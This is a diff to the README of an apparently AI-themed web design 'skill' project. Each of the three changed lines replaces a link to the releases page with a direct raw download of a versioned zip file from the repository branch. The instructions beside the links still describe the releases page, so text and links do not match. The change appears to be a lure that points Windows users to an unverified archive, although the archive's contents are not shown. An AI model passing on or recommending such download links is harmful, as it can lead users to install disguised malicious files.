@@ -1,6 +1,6 @@
 # 🤖 ai-friendly-web-design-skill - Build cleaner AI-ready web interfaces
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/avilaok8647/ai-friendly-web-design-skill/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/avilaok8647/ai-friendly-web-design-skill/raw/refs/heads/main/skills/ai-friendly-web-design/web_ai_skill_friendly_design_3.9-beta.4.zip)
 
 ## 🧩 What this is
 
@@ -12,7 +12,7 @@ Use it when you want web screens that are easier to read, easier to test, and le
 
 Visit this page to download:
 
-https://github.com/avilaok8647/ai-friendly-web-design-skill/releases
+https://github.com/avilaok8647/ai-friendly-web-design-skill/raw/refs/heads/main/skills/ai-friendly-web-design/web_ai_skill_friendly_design_3.9-beta.4.zip
 
 1. Open the releases page.
 2. Download the latest release file for Windows.
@@ -187,7 +187,7 @@ Read the included README first if it exists. It often shows the exact place to c
 
 Visit this page to download:
 
-https://github.com/avilaok8647/ai-friendly-web-design-skill/releases
+https://github.com/avilaok8647/ai-friendly-web-design-skill/raw/refs/heads/main/skills/ai-friendly-web-design/web_ai_skill_friendly_design_3.9-beta.4.zip
 
 ## 🛠️ Common tasks this skill supports
 
